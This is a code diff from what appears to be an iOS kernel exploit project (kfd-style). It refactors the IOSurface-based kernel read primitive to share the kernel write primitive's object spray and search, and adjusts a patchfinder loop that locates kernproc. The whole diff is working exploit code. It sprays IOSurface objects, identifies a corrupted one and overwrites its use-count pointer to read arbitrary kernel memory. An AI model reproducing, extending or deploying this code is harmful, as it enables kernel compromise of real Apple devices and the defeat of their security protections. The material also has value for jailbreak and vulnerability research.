@@ -15,6 +15,7 @@
 #import <mach-o/loader.h>
 #import <mach-o/nlist.h>
 #import <mach-o/reloc.h>
+#import <Foundation/Foundation.h>
 
 
 #define IOSURFACE_MAGIC 0x1EA5CACE
@@ -23,41 +24,29 @@ io_connect_t g_surfaceConnect = 0;
 
 u32 kread_IOSurface_kread_u32(struct kfd* kfd, u64 kaddr);
 
+void kwrite_IOSurface_init(struct kfd*);
+void kwrite_IOSurface_allocate(struct kfd* kfd, u64 id);
+bool kwrite_IOSurface_search(struct kfd* kfd, u64 object_uaddr);
+
 void kread_IOSurface_init(struct kfd* kfd)
 {
-    kfd->kread.krkw_maximum_id = 0x4000;
-    kfd->kread.krkw_object_size = 0x400; //estimate
-
-    kfd->kread.krkw_method_data_size = ((kfd->kread.krkw_maximum_id) * (sizeof(struct iosurface_obj)));
-    kfd->kread.krkw_method_data = malloc_bzero(kfd->kread.krkw_method_data_size);
-    
-    // For some reson on some devices calling get_surface_client crashes while the PUAF is active
-    // So we just call it here and keep the reference
-    g_surfaceConnect = get_surface_client();
+    kwrite_IOSurface_init(kfd);
 }
 
 void kread_IOSurface_allocate(struct kfd* kfd, u64 id)
 {
-    struct iosurface_obj *objectStorage = (struct iosurface_obj *)kfd->kread.krkw_method_data;
-    
-    IOSurfaceFastCreateArgs args = {0};
-    args.IOSurfaceAddress = 0;
-    args.IOSurfaceAllocSize =  (u32)id + 1;
-
-    args.IOSurfacePixelFormat = IOSURFACE_MAGIC;
-
-    objectStorage[id].port = create_surface_fast_path(g_surfaceConnect, &objectStorage[id].surface_id, &args);
+    kwrite_IOSurface_allocate(kfd, id);
 }
 
 bool kread_IOSurface_search(struct kfd* kfd, u64 object_uaddr)
 {
-    u32 magic = dynamic_uget(IOSurface, PixelFormat, object_uaddr);
-    if (magic == IOSURFACE_MAGIC) {
+    bool found = kwrite_IOSurface_search(kfd, object_uaddr);
+    if (found) {
         u64 id = dynamic_uget(IOSurface, AllocSize, object_uaddr) - 1;
         kfd->kread.krkw_object_id = id;
-        return true;
+        kfd->kread.krkw_object_uaddr = object_uaddr;
     }
-    return false;
+    return found;
 }
 
 void kread_IOSurface_kread(struct kfd* kfd, u64 kaddr, void* uaddr, u64 size)
@@ -188,8 +177,8 @@ u64 patchfind_kernproc(struct kfd* kfd, u64 kernel_base)
     
     u64 adrpKaddr = 0;
     u32 adrpInstr = 0;
-    for (u32 i = 0; i < 20; i++) {
-        u64 addr = movKaddr+(4*i);
+    for (u32 i = 0; i < 30; i++) {
+        u64 addr = ldrKaddr-(4*i);
         u32 instr = 0;
         kread((u64)kfd, addr, &instr, sizeof(instr));
         if ((instr & adrpFindMask) == adrpFind) {
@@ -213,7 +202,7 @@ u64 patchfind_kernproc(struct kfd* kfd, u64 kernel_base)
 
 void kread_IOSurface_find_proc(struct kfd* kfd)
 {
-    u64 textPtr = unsign_kaddr(dynamic_uget(IOSurface, isa, kfd->kread.krkw_object_uaddr));
+    u64 textPtr = unsign_kaddr(dynamic_uget(IOSurface, isa, kfd->kwrite.krkw_object_uaddr));
     
     struct mach_header_64 kernel_header;
     
@@ -265,16 +254,16 @@ void kread_IOSurface_find_proc(struct kfd* kfd)
 
 void kread_IOSurface_deallocate(struct kfd* kfd, u64 id)
 {
-    if (id != kfd->kread.krkw_object_id) {
-        struct iosurface_obj *objectStorage = (struct iosurface_obj *)kfd->kread.krkw_method_data;
+    if (id != kfd->kwrite.krkw_object_id) {
+        struct iosurface_obj *objectStorage = (struct iosurface_obj *)kfd->kwrite.krkw_method_data;
         release_surface(objectStorage[id].port, objectStorage[id].surface_id);
     }
 }
 
 void kread_IOSurface_free(struct kfd* kfd)
 {
-    struct iosurface_obj *objectStorage = (struct iosurface_obj *)kfd->kread.krkw_method_data;
-    struct iosurface_obj krwObject = objectStorage[kfd->kread.krkw_object_id];
+    struct iosurface_obj *objectStorage = (struct iosurface_obj *)kfd->kwrite.krkw_method_data;
+    struct iosurface_obj krwObject = objectStorage[kfd->kwrite.krkw_object_id];
     release_surface(krwObject.port, krwObject.surface_id);
 }
 
@@ -284,9 +273,9 @@ void kread_IOSurface_free(struct kfd* kfd)
 
 u32 kread_IOSurface_kread_u32(struct kfd* kfd, u64 kaddr)
 {
-    u64 iosurface_uaddr = kfd->kread.krkw_object_uaddr;
-    struct iosurface_obj *objectStorage = (struct iosurface_obj *)kfd->kread.krkw_method_data;
-    struct iosurface_obj krwObject = objectStorage[kfd->kread.krkw_object_id];
+    u64 iosurface_uaddr = kfd->kwrite.krkw_object_uaddr;
+    struct iosurface_obj *objectStorage = (struct iosurface_obj *)kfd->kwrite.krkw_method_data;
+    struct iosurface_obj krwObject = objectStorage[kfd->kwrite.krkw_object_id];
     
     u64 backup = dynamic_uget(IOSurface, UseCountPtr, iosurface_uaddr);
     dynamic_uset(IOSurface, UseCountPtr, iosurface_uaddr, kaddr - dynamic_offsetof(IOSurface, ReadDisplacement));
